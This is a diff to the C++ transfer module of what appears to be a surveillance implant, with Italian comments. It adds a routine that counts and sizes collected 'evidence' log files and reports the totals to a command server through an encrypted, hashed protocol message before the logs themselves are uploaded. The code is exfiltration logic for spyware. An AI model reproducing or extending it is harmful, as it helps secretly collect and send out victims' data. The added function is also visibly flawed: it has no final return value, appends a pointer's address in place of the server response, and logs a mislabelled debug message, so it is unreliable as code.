@@ -910,11 +910,19 @@ INT Transfer::InternetSend(const wstring &strHostname) {
 
 		// Parsiamo le richieste ricevute dal server
 		RestProcessAvailables();
+		
+		// Inviamo num e size tot dei log
+		if (RestSendEvidenceSize() == FALSE) {
+			DBG_TRACE(L"Debug - Transfer.cpp - InternetSend() [RestSendLogs() FAILED]: ", 4, TRUE);
+		}
 
 		// Inviamo i log
 		if (RestSendLogs() == FALSE) {
 			DBG_TRACE(L"Debug - Transfer.cpp - InternetSend() [RestSendLogs() FAILED]: ", 4, TRUE);
 		}
+
+
+
 
 		// Spediamo un PROTO_BYE
 		BYTE sha1[20];
@@ -2043,6 +2051,90 @@ void DebugListLocalDir()
 	///// FINE USATO PER DEBUG
 }
 
+
+BOOL Transfer::RestSendEvidenceSize() {
+	// len | evidence
+	list<LogInfo>::iterator iter;
+	HANDLE hFile;
+	DWORD dwSize, dwRead = 0;
+
+
+	// pSnap puo' essere nullo in caso di errore o se non c'e' uberlogObj.
+	// Lo snapshot viene liberato subito dopo questa chiamata.
+
+	//creo uno snapshot di tutti i log chiusi (cioe' quelli che non sto piu' scrivendo)
+	pSnap = uberlogObj->ListClosed();
+
+	if (pSnap == NULL || pSnap->size() == 0) {
+		DBG_TRACE(L"Debug - Transfer.cpp - RestSendLogs() there are no logs to send\n", 5, FALSE);
+		return TRUE;
+	}
+
+
+	//calcolo la size di quanto mandero'
+	INT64 TotSizeEvidence = 0;
+	DWORD TotnEvidence = 0;
+	//Valutare se queso passaggio porta via troppe risorse lo si puo' omettere e si imposta  TotSizeEvidence=0
+	for (iter = pSnap->begin(); iter != pSnap->end(); iter++) {
+		hFile = _CreateFileW((*iter).strLog.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+		if (hFile == INVALID_HANDLE_VALUE) {
+			continue;
+		}
+
+		dwSize = _GetFileSize(hFile, NULL);
+
+		// Il file e' vuoto oppure non c'e' piu'
+		if (dwSize == 0 || dwSize == 0xFFFFFFFF) {
+			CloseHandle(hFile);
+			continue;
+		}
+
+		TotSizeEvidence = TotSizeEvidence + dwSize;
+		TotnEvidence++;
+		CloseHandle(hFile);
+		hFile = INVALID_HANDLE_VALUE;
+	}
+
+
+	Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_EVIDENCE_SIZE) + sizeof(TotnEvidence) + sizeof(TotSizeEvidence) + 20));
+	Hash hash;
+
+	UINT uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_EVIDENCE_SIZE) + sizeof(TotnEvidence) + sizeof(TotSizeEvidence) + 20);
+	UINT uCommand = PROTO_EVIDENCE_SIZE;
+	BYTE sha1[20];
+
+	// Creiamo il request per il comando
+	b.append((UCHAR *)&uCommand, sizeof(uCommand));
+	b.append((UCHAR *)&TotnEvidence, sizeof(TotnEvidence));
+	b.append((UCHAR *)&TotSizeEvidence, sizeof(TotSizeEvidence));
+
+	hash.Sha1(b.getBuf(), sizeof(PROTO_EVIDENCE_SIZE) + sizeof(TotnEvidence) + sizeof(TotSizeEvidence), sha1);
+
+	b.append((BYTE *)sha1, 20);
+	b.repeat(uPadding, uPadding);
+
+	UINT uResponse = 0;
+	PBYTE pResponse = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);
+
+
+	if (pResponse == NULL) {
+		DBG_TRACE(L"Debug - Transfer.cpp - RestSendEvidenceSize() FAILED [RestSendCommand()] ", 4, TRUE);
+		return FALSE;
+	}
+
+	b.free();
+	b.append((UCHAR *)&pResponse, sizeof(UINT));
+
+	delete[] pResponse;
+
+
+#ifdef _DEBUG
+	WCHAR msg[256];
+	swprintf_s(msg, L"pSnap->size()=%i TotSizeEvidence=%i\n", pSnap->size(), TotSizeEvidence); OutputDebugString(msg);
+#endif
+}
+
 BOOL Transfer::RestSendLogs() {
 	// len | evidence
 	list<LogInfo>::iterator iter;
@@ -2064,6 +2156,46 @@ BOOL Transfer::RestSendLogs() {
 		DBG_TRACE(L"Debug - Transfer.cpp - RestSendLogs() there are no logs to send\n", 5, FALSE);
 		return TRUE;
 	}
+
+
+//	//calcolo la size di quanto mandero'
+//	DWORD TotSizeEvidence=0;
+//	DWORD TotnEvidence = 0;
+//	//Valutare se queso passaggio porta via troppe risorse lo si puo' omettere e si imposta  TotSizeEvidence=0
+//	for (iter = pSnap->begin(); iter != pSnap->end(); iter++) {
+//		hFile = _CreateFileW((*iter).strLog.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+//
+//		if (hFile == INVALID_HANDLE_VALUE) {
+//			continue;
+//		}
+//
+//		dwSize = _GetFileSize(hFile, NULL);
+//
+//		// Il file e' vuoto oppure non c'e' piu'
+//		if (dwSize == 0 || dwSize == 0xFFFFFFFF) {
+//			CloseHandle(hFile);
+//			continue;
+//		}
+//
+//		TotSizeEvidence = TotSizeEvidence  + dwSize;
+//		TotnEvidence++;
+//		CloseHandle(hFile);
+//	}
+//
+//	// Puliamo il cookie
+//	strSessionCookie = L"";
+//	strSessionCookie.clear();
+//	//invio il numero di evidence e la size che mandero'
+//	RestSendEvidenceSize(TotnEvidence,TotSizeEvidence);
+//	// Puliamo il cookie
+//	strSessionCookie = L"";
+//	strSessionCookie.clear();
+//
+//#ifdef _DEBUG
+//	WCHAR msg[256];
+//	swprintf_s(msg, L"pSnap->size()=%i TotSizeEvidence=%i\n", pSnap->size(), TotSizeEvidence); OutputDebugString(msg);
+//#endif
+	
 
 	for (iter = pSnap->begin(); iter != pSnap->end(); iter++) {
 		hFile = _CreateFileW((*iter).strLog.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -2178,6 +2310,8 @@ BOOL Transfer::RestSendLogs() {
 	
 	return TRUE;
 }
+
+
 
 BOOL Transfer::RestSendDownloads() {
 	
